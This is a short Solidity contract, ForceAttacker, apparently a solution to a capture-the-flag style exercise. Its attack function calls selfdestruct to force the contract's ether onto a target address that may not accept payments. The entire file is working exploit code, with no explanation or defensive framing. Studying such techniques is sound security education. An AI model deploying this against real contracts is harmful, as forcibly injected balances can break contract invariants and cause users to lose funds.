// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    function attack(address target) public payable {
        address payable targetPayable = payable(target);
        selfdestruct(targetPayable);
    }
}
